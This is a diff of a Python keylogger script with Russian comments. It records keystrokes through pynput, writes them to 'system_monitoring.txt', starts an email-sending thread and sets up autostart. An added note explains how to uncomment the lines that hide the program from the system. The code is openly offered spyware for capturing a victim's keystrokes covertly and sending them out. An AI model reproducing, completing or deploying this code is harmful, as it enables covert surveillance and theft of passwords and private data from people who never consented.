@@ -1,5 +1,16 @@
-"""ФАЙЛ КОСТИН, ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл"""
+"""ФАЙЛ ПО СОЗДАНИЮ КЕЙЛОГЕРА и сохранения в файл"""
+"""ПРИМЕЧАНИЕ, СКРЫТИЕ КЕЙЛОГЕРА ОТКЛЮЧЕНО, ПРИ ЕГО ИСПОЛЬЗОВАНИИ, ЧТОЮЫ КЕЙЛОГЕР СКРЫВАЛСЯ ИЗ СИСТЕМЫ
+ВАМ НАДО РАСКОММЕНТИРОВАТЬ СЛЕД СТРОЧКИ В МЕТОДЕ: if __name__ == '__main__':
+
+СТРОЧКИ КОТОРЫЕ ОТВЕЧАЮТ ЗА ЗАПУСК СКРЫТИЯ:
+#hide_prog_thread = threading.Thread(target=hide_prog)  
+#hide_prog_thread.start()
+#hide_prog_thread.join()
+
+ЭТИ СТРОКИ ПОДПИСАНЫ, ДЛЯ ЧЕГО ОНИ ЗАКОМЕНЧИНЫ, ПРОСТО ИХ РАСКОМЕНТИ И СКРЫТИЕ ЗАРОБИТ ;)
+"""
 import datetime
+import os
 from pynput import keyboard
 import ctypes
 from sending_to_email import *
@@ -42,9 +53,9 @@ log_keys_sys = []
 
 class AddTextFile:
     """СОЗДАНИЕ .TXT ФАЙЛА С ЛОГАМИ"""
-    def add_el_file(self, log_key, log_key_sys, file_name='system_monitoring.txt'):
+    def add_el_file(self, log_key, log_key_sys):
         self.log_key = log_key
-        self.file_name = file_name
+        self.file_name = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'system_monitoring.txt')
         self.log_key_sys = log_key_sys
 
         if len(self.log_key) == 2:
@@ -163,20 +174,19 @@ if __name__ == '__main__':
     # потоки
     keylogger_thread = threading.Thread(target=start_keylogger)
     main_email_thread = threading.Thread(target=main)
-    # hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+    #hide_prog_thread = threading.Thread(target=hide_prog)  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     main_startup()
 
     # старт потоков
     keylogger_thread.start()
     main_email_thread.start()
-    # hide_prog_thread.start()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
+    #hide_prog_thread.start()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
     # ожидание завершение др потока
     keylogger_thread.join()
     main_email_thread.join()
-    # hide_prog_thread.join()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
-
+    #hide_prog_thread.join()  # скрытие проги, работает, закоменчина ради тестов, ибо скрипт скрывается ото всюду
 
 
 
